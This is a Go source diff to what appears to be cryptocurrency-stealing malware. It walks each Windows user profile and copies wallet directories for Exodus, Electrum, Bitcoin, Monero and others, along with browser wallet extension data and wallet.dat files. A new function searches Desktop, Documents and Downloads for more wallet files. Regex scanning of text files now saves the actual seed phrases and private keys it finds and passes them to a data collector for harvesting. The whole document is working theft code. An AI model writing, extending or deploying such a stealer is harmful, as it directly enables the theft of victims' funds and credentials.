@@ -19,6 +19,7 @@ func Run(dataCollector *collector.DataCollector) {
 	WalletExtensions(dataCollector)
 	WalletFiles(dataCollector)
 	CryptoFiles(dataCollector)
+	WalletDatFiles(dataCollector)
 }
 
 func LocalWallets(dataCollector *collector.DataCollector) {
@@ -33,82 +34,85 @@ func LocalWallets(dataCollector *collector.DataCollector) {
 	// Enhanced wallet paths with more locations
 	walletPaths := map[string][]string{
 		"Zcash": {
-			"\\Zcash",
-			"\\AppData\\Roaming\\Zcash",
+			"AppData\\Roaming\\Zcash",
+			"AppData\\Local\\Zcash",
 		},
 		"Armory": {
-			"\\Armory",
-			"\\AppData\\Roaming\\Armory",
+			"AppData\\Roaming\\Armory",
+			"AppData\\Local\\Armory",
 		},
 		"Bytecoin": {
-			"\\bytecoin",
-			"\\AppData\\Roaming\\bytecoin",
+			"AppData\\Roaming\\bytecoin",
+			"AppData\\Local\\bytecoin",
 		},
 		"Jaxx": {
-			"\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
-			"\\AppData\\Roaming\\com.liberty.jaxx",
+			"AppData\\Roaming\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
+			"AppData\\Local\\com.liberty.jaxx",
 		},
 		"Exodus": {
-			"\\Exodus\\exodus.wallet",
-			"\\Exodus",
-			"\\AppData\\Roaming\\Exodus",
-			"\\AppData\\Local\\Exodus",
+			"AppData\\Roaming\\Exodus\\exodus.wallet",
+			"AppData\\Roaming\\Exodus",
+			"AppData\\Local\\Exodus",
 		},
 		"Ethereum": {
-			"\\Ethereum\\keystore",
-			"\\AppData\\Roaming\\Ethereum",
+			"AppData\\Roaming\\Ethereum\\keystore",
+			"AppData\\Local\\Ethereum",
 		},
 		"Electrum": {
-			"\\Electrum\\wallets",
-			"\\Electrum",
-			"\\AppData\\Roaming\\Electrum",
+			"AppData\\Roaming\\Electrum\\wallets",
+			"AppData\\Local\\Electrum",
 		},
 		"AtomicWallet": {
-			"\\atomic\\Local Storage\\leveldb",
-			"\\atomic",
-			"\\AppData\\Roaming\\atomic",
+			"AppData\\Roaming\\atomic\\Local Storage\\leveldb",
+			"AppData\\Local\\atomic",
 		},
 		"Guarda": {
-			"\\Guarda\\Local Storage\\leveldb",
-			"\\Guarda",
-			"\\AppData\\Roaming\\Guarda",
+			"AppData\\Roaming\\Guarda\\Local Storage\\leveldb",
+			"AppData\\Local\\Guarda",
 		},
 		"Coinomi": {
-			"\\Coinomi\\Coinomi\\wallets",
-			"\\Coinomi",
-			"\\AppData\\Local\\Coinomi",
+			"AppData\\Local\\Coinomi\\Coinomi\\wallets",
+			"AppData\\Roaming\\Coinomi",
 		},
 		"Bitcoin": {
-			"\\Bitcoin",
-			"\\AppData\\Roaming\\Bitcoin",
+			"AppData\\Roaming\\Bitcoin",
+			"AppData\\Local\\Bitcoin",
 		},
 		"Litecoin": {
-			"\\Litecoin",
-			"\\AppData\\Roaming\\Litecoin",
+			"AppData\\Roaming\\Litecoin",
+			"AppData\\Local\\Litecoin",
 		},
 		"Dogecoin": {
-			"\\Dogecoin",
-			"\\AppData\\Roaming\\Dogecoin",
+			"AppData\\Roaming\\Dogecoin",
+			"AppData\\Local\\Dogecoin",
 		},
 		"Dash": {
-			"\\DashCore",
-			"\\AppData\\Roaming\\DashCore",
+			"AppData\\Roaming\\DashCore",
+			"AppData\\Local\\DashCore",
 		},
 		"Monero": {
-			"\\Monero",
-			"\\AppData\\Roaming\\Monero",
+			"AppData\\Roaming\\Monero",
+			"AppData\\Local\\Monero",
 		},
 		"Electroneum": {
-			"\\Electroneum",
-			"\\AppData\\Roaming\\Electroneum",
+			"AppData\\Roaming\\Electroneum",
+			"AppData\\Local\\Electroneum",
 		},
 		"Raven": {
-			"\\Raven",
-			"\\AppData\\Roaming\\Raven",
+			"AppData\\Roaming\\Raven",
+			"AppData\\Local\\Raven",
 		},
 		"Chia": {
-			"\\Chia",
-			"\\AppData\\Local\\Chia",
+			"AppData\\Local\\Chia",
+			"AppData\\Roaming\\Chia",
+		},
+		"Daedalus": {
+			"AppData\\Roaming\\Daedalus",
+			"AppData\\Local\\Daedalus",
+		},
+		"Yoroi": {
+			"AppData\\Roaming\\Yoroi",
+			"AppData\\Local\\Yoroi",
 		},
 	}
 
@@ -117,59 +121,26 @@ func LocalWallets(dataCollector *collector.DataCollector) {
 		
 		for walletName, paths := range walletPaths {
 			for _, path := range paths {
-				// Try both Roaming and Local paths
-				fullPaths := []string{
-					filepath.Join(user, "AppData", "Roaming") + path,
-					filepath.Join(user, "AppData", "Local") + path,
-					user + path,
-				}
+				fullPath := filepath.Join(user, path)
 				
-				for _, fullPath := range fullPaths {
-					if !fileutil.IsDir(fullPath) && !fileutil.Exists(fullPath) {
-						continue
-					}
-
-					destPath := filepath.Join(tempDir, userName, walletName)
-					os.MkdirAll(destPath, os.ModePerm)
-
-					var err error
-					if fileutil.IsDir(fullPath) {
-						err = fileutil.CopyDir(fullPath, destPath)
-					} else {
-						err = fileutil.CopyFile(fullPath, filepath.Join(destPath, filepath.Base(fullPath)))
-					}
-
-					if err == nil {
-						found += fmt.Sprintf("\n✅ %s - %s", userName, walletName)
-						totalFiles++
-						break // Found this wallet, move to next
-					}
+				if !fileutil.IsDir(fullPath) && !fileutil.Exists(fullPath) {
+					continue
 				}
-			}
-		}
 
-		// Search for wallet.dat files in common locations
-		walletDatPaths := []string{
-			filepath.Join(user, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
-			filepath.Join(user, "AppData", "Roaming", "Litecoin", "wallet.dat"),
-			filepath.Join(user, "AppData", "Roaming", "Dogecoin", "wallet.dat"),
-			filepath.Join(user, "AppData", "Roaming", "DashCore", "wallet.dat"),
-			filepath.Join(user, "AppData", "Roaming", "Electroneum", "wallet.dat"),
-			filepath.Join(user, "AppData", "Roaming", "Raven", "wallet.dat"),
-			filepath.Join(user, "Desktop", "wallet.dat"),
-			filepath.Join(user, "Documents", "wallet.dat"),
-			filepath.Join(user, "Downloads", "wallet.dat"),
-		}
+				destPath := filepath.Join(tempDir, userName, walletName)
+				os.MkdirAll(destPath, os.ModePerm)
 
-		for _, walletPath := range walletDatPaths {
-			if fileutil.Exists(walletPath) {
-				walletDir := filepath.Base(filepath.Dir(walletPath))
-				destPath := filepath.Join(tempDir, userName, "WalletDat", walletDir+"_wallet.dat")
-				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
-				
-				if err := fileutil.CopyFile(walletPath, destPath); err == nil {
-					found += fmt.Sprintf("\n✅ %s - %s wallet.dat", userName, walletDir)
+				var err error
+				if fileutil.IsDir(fullPath) {
+					err = fileutil.CopyDir(fullPath, destPath)
+				} else {
+					err = fileutil.CopyFile(fullPath, filepath.Join(destPath, filepath.Base(fullPath)))
+				}
+
+				if err == nil {
+					found += fmt.Sprintf("\n✅ %s - %s", userName, walletName)
 					totalFiles++
+					break // Found this wallet, move to next
 				}
 			}
 		}
@@ -245,11 +216,6 @@ func WalletExtensions(dataCollector *collector.DataCollector) {
 		"XinPay":            "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo",
 		"Yoroi":             "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
 		"iWallet":           "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
-		// Additional popular wallets
-		"TrustWallet":       "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
-		"CoinbaseWallet":    "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
-		"BinanceChain":      "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
-		"WalletConnect":     "\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma",
 	}
 
 	users := hardware.GetUsers()
@@ -361,6 +327,7 @@ func WalletFiles(dataCollector *collector.DataCollector) {
 		"bch", "xmr", "monero", "dash", "zcash", "doge",
 		"dogecoin", "shib", "shiba", "usdt", "usdc",
 		"dai", "busd", "tusd", "pax", "gusd", "husd",
+		"electroneum", "etn",
 	}
 
 	for _, user := range users {
@@ -436,6 +403,92 @@ func WalletFiles(dataCollector *collector.DataCollector) {
 	}
 }
 
+func WalletDatFiles(dataCollector *collector.DataCollector) {
+	users := hardware.GetUsers()
+	tempDir := filepath.Join(os.TempDir(), "wallet-dat-temp")
+	os.MkdirAll(tempDir, os.ModePerm)
+	defer os.RemoveAll(tempDir)
+
+	found := ""
+	totalFiles := 0
+
+	for _, user := range users {
+		userName := strings.Split(user, "\\")[2]
+		
+		// Search for wallet.dat files in common locations
+		walletDatPaths := []string{
+			filepath.Join(user, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
+			filepath.Join(user, "AppData", "Roaming", "Litecoin", "wallet.dat"),
+			filepath.Join(user, "AppData", "Roaming", "Dogecoin", "wallet.dat"),
+			filepath.Join(user, "AppData", "Roaming", "DashCore", "wallet.dat"),
+			filepath.Join(user, "AppData", "Roaming", "Electroneum", "wallet.dat"),
+			filepath.Join(user, "AppData", "Roaming", "Raven", "wallet.dat"),
+			filepath.Join(user, "AppData", "Roaming", "Zcash", "wallet.dat"),
+			filepath.Join(user, "AppData", "Local", "Bitcoin", "wallet.dat"),
+			filepath.Join(user, "AppData", "Local", "Litecoin", "wallet.dat"),
+			filepath.Join(user, "AppData", "Local", "Dogecoin", "wallet.dat"),
+			filepath.Join(user, "AppData", "Local", "Electroneum", "wallet.dat"),
+			filepath.Join(user, "Desktop", "wallet.dat"),
+			filepath.Join(user, "Documents", "wallet.dat"),
+			filepath.Join(user, "Downloads", "wallet.dat"),
+		}
+
+		for _, walletPath := range walletDatPaths {
+			if fileutil.Exists(walletPath) {
+				walletDir := filepath.Base(filepath.Dir(walletPath))
+				destPath := filepath.Join(tempDir, userName, "WalletDat", walletDir+"_wallet.dat")
+				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
+				
+				if err := fileutil.CopyFile(walletPath, destPath); err == nil {
+					found += fmt.Sprintf("\n✅ %s - %s wallet.dat", userName, walletDir)
+					totalFiles++
+				}
+			}
+		}
+
+		// Search for any wallet.dat files in Desktop and Documents
+		searchDirs := []string{
+			filepath.Join(user, "Desktop"),
+			filepath.Join(user, "Documents"),
+			filepath.Join(user, "Downloads"),
+		}
+
+		for _, dir := range searchDirs {
+			if !fileutil.IsDir(dir) {
+				continue
+			}
+
+			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
+				if err != nil || info.IsDir() {
+					return nil
+				}
+
+				if strings.ToLower(info.Name()) == "wallet.dat" {
+					destPath := filepath.Join(tempDir, userName, "FoundWalletDat", filepath.Base(dir)+"_"+info.Name())
+					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
+					
+					if err := fileutil.CopyFile(path, destPath); err == nil {
+						found += fmt.Sprintf("\n✅ %s - Found wallet.dat in %s", userName, filepath.Base(dir))
+						totalFiles++
+					}
+				}
+
+				return nil
+			})
+		}
+	}
+
+	if found != "" {
+		walletDatInfo := map[string]interface{}{
+			"WalletDatFound": found,
+			"TotalFiles":     totalFiles,
+			"TreeView":       fileutil.Tree(tempDir, ""),
+		}
+		dataCollector.AddData("wallet_dat", walletDatInfo)
+		dataCollector.AddDirectory("wallet_dat", tempDir, "wallet_dat_files")
+	}
+}
+
 func CryptoFiles(dataCollector *collector.DataCollector) {
 	users := hardware.GetUsers()
 	tempDir := filepath.Join(os.TempDir(), "crypto-files-temp")
@@ -446,25 +499,25 @@ func CryptoFiles(dataCollector *collector.DataCollector) {
 	patterns := map[string]*regexp.Regexp{
 		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
 		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
-		"bitcoin_private_key":   regexp.MustCompile(`[5KL][1-9A-HJ-NP-Za-km-z]{50,51}`),
+		"bitcoin_private_key_5": regexp.MustCompile(`5[HJK][1-9A-HJ-NP-Za-km-z]{49}`),
+		"bitcoin_private_key_K": regexp.MustCompile(`K[1-9A-HJ-NP-Za-km-z]{51}`),
+		"bitcoin_private_key_L": regexp.MustCompile(`L[1-9A-HJ-NP-Za-km-z]{51}`),
 		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
-		"bitcoin_address":       regexp.MustCompile(`[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}`),
+		"bitcoin_address_1":     regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
+		"bitcoin_address_3":     regexp.MustCompile(`3[a-km-zA-HJ-NP-Z1-9]{25,34}`),
+		"bitcoin_address_bc1":   regexp.MustCompile(`bc1[a-z0-9]{39,59}`),
 		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
 		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
 		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
 		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
 		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
 		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
-		"ripple_address":        regexp.MustCompile(`r[0-9a-zA-Z]{24,34}`),
-		"stellar_address":       regexp.MustCompile(`G[A-Z2-7]{55}`),
-		"cardano_address":       regexp.MustCompile(`addr1[a-z0-9]+`),
-		"tron_address":          regexp.MustCompile(`T[A-Za-z1-9]{33}`),
-		"binance_address":       regexp.MustCompile(`bnb1[a-z0-9]{38}`),
-		"solana_address":        regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`),
+		"electroneum_address":   regexp.MustCompile(`etn[1-9A-HJ-NP-Za-km-z]{95}`),
 	}
 
 	found := 0
 	suspiciousFiles := make(map[string][]string)
+	cryptoData := make(map[string]string)
 
 	for _, user := range users {
 		userName := strings.Split(user, "\\")[2]
@@ -490,7 +543,7 @@ func CryptoFiles(dataCollector *collector.DataCollector) {
 
 				// Only check text files
 				ext := strings.ToLower(filepath.Ext(info.Name()))
-				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem"}
+				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem", ".backup", ".wallet"}
 				isTextFile := false
 				for _, textExt := range textExts {
 					if ext == textExt {
@@ -512,6 +565,11 @@ func CryptoFiles(dataCollector *collector.DataCollector) {
 				for patternName, pattern := range patterns {
 					if pattern.MatchString(content) {
 						matches = append(matches, patternName)
+						// Store actual matches for analysis
+						foundMatches := pattern.FindAllString(content, -1)
+						for _, match := range foundMatches {
+							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
+						}
 					}
 				}
 
@@ -542,11 +600,22 @@ func CryptoFiles(dataCollector *collector.DataCollector) {
 			summaryContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
 			summaryContent += "---\n\n"
 		}
+		
+		// Add found crypto data
+		if len(cryptoData) > 0 {
+			summaryContent += "\n💰 FOUND CRYPTO DATA\n"
+			summaryContent += "===================\n\n"
+			for key, value := range cryptoData {
+				summaryContent += fmt.Sprintf("%s: %s\n", key, value)
+			}
+		}
+		
 		fileutil.AppendFile(summaryPath, summaryContent)
 
 		cryptoInfo := map[string]interface{}{
 			"CryptoFilesFound":  found,
 			"SuspiciousFiles":   suspiciousFiles,
+			"CryptoDataFound":   cryptoData,
 			"TreeView":          fileutil.Tree(tempDir, ""),
 		}
 		dataCollector.AddData("crypto_files", cryptoInfo)
